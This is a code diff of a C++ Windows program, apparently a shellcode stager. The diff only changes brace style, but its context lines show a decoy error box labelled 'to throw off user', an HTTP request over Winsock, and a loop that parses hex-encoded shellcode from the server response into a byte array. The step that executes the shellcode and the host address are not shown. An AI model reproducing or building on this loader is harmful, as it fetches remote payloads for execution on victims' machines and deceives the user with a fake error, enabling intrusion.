@@ -8,8 +8,7 @@
 
 using namespace std;
 
-int messagebox()
-{
+int messagebox() {
 	int msgboxID = MessageBox(
 		NULL,
 		L"Error to throw off user. ",
@@ -19,8 +18,7 @@ int messagebox()
 	return msgboxID;
 }
 
-int main()
-{
+int main() {
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
@@ -53,15 +51,13 @@ int main()
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
-	while (recv(sock, buf, 8192, 0))
-	{
+	while (recv(sock, buf, 8192, 0)) {
 		response += buf;
 	}
 
 	// convert shellcode string from http response into byte array
 	string shellcode_str = response.substr(response.find("\r\n\r\n"));
-	for (int i = 0; i < shellcode_str.size() / 4; ++i)
-	{
+	for (int i = 0; i < shellcode_str.size() / 4; ++i) {
 		shellcode[i] = strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
 	}
 
